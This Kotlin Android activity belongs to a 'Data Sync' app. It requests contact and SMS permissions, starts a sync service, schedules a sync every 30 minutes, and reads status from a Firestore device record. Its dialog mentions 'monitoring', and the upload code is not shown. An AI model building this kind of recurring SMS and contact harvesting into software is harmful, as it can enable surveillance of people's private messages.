package com.datasync.user

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import com.datasync.user.sync.SyncService
import com.datasync.user.sync.SyncWorker
import com.datasync.user.utils.DeviceIdHelper
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            MaterialTheme {
                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                    SyncScreen()
                }
            }
        }
        setupWorkManager()
    }

    private fun setupWorkManager() {
        val syncRequest = PeriodicWorkRequestBuilder<SyncWorker>(30, TimeUnit.MINUTES)
            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "PeriodicSync",
            ExistingPeriodicWorkPolicy.KEEP,
            syncRequest
        )
    }
}

@Composable
fun SyncScreen() {
    val context = LocalContext.current
    val activity = context as MainActivity
    val scope = rememberCoroutineScope()
    val snackbarHostState = remember { SnackbarHostState() }
    val deviceId = remember { DeviceIdHelper.getDeviceId(context) }
    var lastSyncTime by remember { mutableStateOf("Never") }
    var syncStatus by remember { mutableStateOf("Idle") }
    var showRationale by remember { mutableStateOf(false) }
    var showSettingsDialog by remember { mutableStateOf(false) }
    var isLoading by remember { mutableStateOf(false) }

    val permissions = remember {
        mutableListOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS
        ).apply {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }.toTypedArray()
    }

    val launcher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { perms ->
        val allGranted = perms.entries.filter { it.key != Manifest.permission.POST_NOTIFICATIONS }.all { it.value }
        if (allGranted) {
            startSyncService(context)
        } else {
            val showRationaleAgain = perms.keys.any { ActivityCompat.shouldShowRequestPermissionRationale(activity, it) }
            if (!showRationaleAgain) {
                showSettingsDialog = true
            } else {
                scope.launch {
                    snackbarHostState.showSnackbar("Permissions are required for sync")
                }
            }
        }
    }

    LaunchedEffect(Unit) {
        FirebaseFirestore.getInstance().collection("devices").document(deviceId)
            .addSnapshotListener { snapshot, _ ->
                snapshot?.getLong("lastSyncTime")?.let {
                    val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    lastSyncTime = sdf.format(Date(it))
                    syncStatus = "Idle"
                    isLoading = false
                }
            }

        if (hasPermissions(context, permissions)) {
            startSyncService(context)
        }
    }

    Scaffold(
        snackbarHost = { SnackbarHost(snackbarHostState) }
    ) { padding ->
        if (showRationale) {
            AlertDialog(
                onDismissRequest = { showRationale = false },
                title = { Text("Permissions Required") },
                text = { Text("This app needs access to your contacts and SMS to sync them to the cloud for backup and monitoring purposes.") },
                confirmButton = {
                    Button(onClick = {
                        showRationale = false
                        launcher.launch(permissions)
                    }) {
                        Text("Grant Permissions")
                    }
                },
                dismissButton = {
                    TextButton(onClick = { showRationale = false }) {
                        Text("Later")
                    }
                }
            )
        }

        if (showSettingsDialog) {
            AlertDialog(
                onDismissRequest = { showSettingsDialog = false },
                title = { Text("Permissions Permanently Denied") },
                text = { Text("You have permanently denied some permissions. Please enable them in app settings to use the sync feature.") },
                confirmButton = {
                    Button(onClick = {
                        showSettingsDialog = false
                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                            data = Uri.fromParts("package", context.packageName, null)
                        }
                        context.startActivity(intent)
                    }) {
                        Text("Open Settings")
                    }
                },
                dismissButton = {
                    TextButton(onClick = { showSettingsDialog = false }) {
                        Text("Cancel")
                    }
                }
            )
        }

        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(16.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            Text("Data Sync", fontSize = 32.sp, fontWeight = FontWeight.Bold)
            Spacer(modifier = Modifier.height(24.dp))

            Card(
                modifier = Modifier.fillMaxWidth(),
                elevation = CardDefaults.cardElevation(defaultElevation = 4.dp)
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text("Device ID: $deviceId", fontSize = 14.sp)
                    Spacer(modifier = Modifier.height(8.dp))
                    Text("Last Sync: $lastSyncTime", fontWeight = FontWeight.Medium)
                    Spacer(modifier = Modifier.height(8.dp))
                    Text("Status: $syncStatus")
                }
            }

            Spacer(modifier = Modifier.height(32.dp))

            if (isLoading) {
                CircularProgressIndicator()
            } else {
                Button(
                    onClick = {
                        if (hasPermissions(context, permissions)) {
                            syncStatus = "Syncing..."
                            isLoading = true
                            startSyncService(context)
                            scope.launch {
                                snackbarHostState.showSnackbar("Sync Started")
                            }
                        } else {
                            val shouldShowRationale = permissions.any { ActivityCompat.shouldShowRequestPermissionRationale(activity, it) }
                            if (shouldShowRationale) {
                                showRationale = true
                            } else {
                                launcher.launch(permissions)
                            }
                        }
                    },
                    modifier = Modifier.fillMaxWidth().height(56.dp)
                ) {
                    Text("Sync Now")
                }
            }
        }
    }
}

private fun hasPermissions(context: android.content.Context, permissions: Array<String>): Boolean {
    return permissions.all {
        if (it == Manifest.permission.POST_NOTIFICATIONS && Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
            true
        } else {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }
}

private fun startSyncService(context: android.content.Context) {
    val intent = Intent(context, SyncService::class.java)
    try {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
    } catch (e: Exception) {
        e.printStackTrace()
    }
}
